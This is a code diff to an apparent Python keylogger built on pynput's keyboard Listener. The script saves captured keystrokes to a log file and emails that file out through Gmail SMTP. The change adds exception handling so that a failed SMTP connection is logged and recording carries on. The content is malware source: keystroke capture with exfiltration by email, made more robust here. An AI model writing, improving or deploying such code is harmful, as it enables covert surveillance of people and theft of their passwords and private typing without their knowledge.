@@ -1,6 +1,7 @@
 from pynput.keyboard import Key, Listener
 from re import sub
 import smtplib
+import socket
 import time
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -53,13 +54,16 @@ def send_email(filename, attachment):
     msg.attach(p)
 
     # sending email via SMTP
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    s.login(fromaddr, password)
+    try:
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        s.starttls()
+        s.login(fromaddr, password)
 
-    text = msg.as_string()
-    s.sendmail(fromaddr, toaddr, text)
-    s.quit()
+        text = msg.as_string()
+        s.sendmail(fromaddr, toaddr, text)
+        s.quit()
+    except socket.error:
+        raise RuntimeError
 
 
 if __name__ == "__main__":
@@ -109,7 +113,10 @@ if __name__ == "__main__":
             print("sending email...")                                # optional
             with open(path + filename, "a") as f:
                 f.write("\n\n[Sending email ... ]\n")
-                send_email(filename, path + filename)
+                try:
+                    send_email(filename, path + filename)
+                except RuntimeError:
+                    f.write("\n[refused to connect. Recording will resume]\n")
                 f.write("[done]\n\n")                                # optional
             print("done")
 
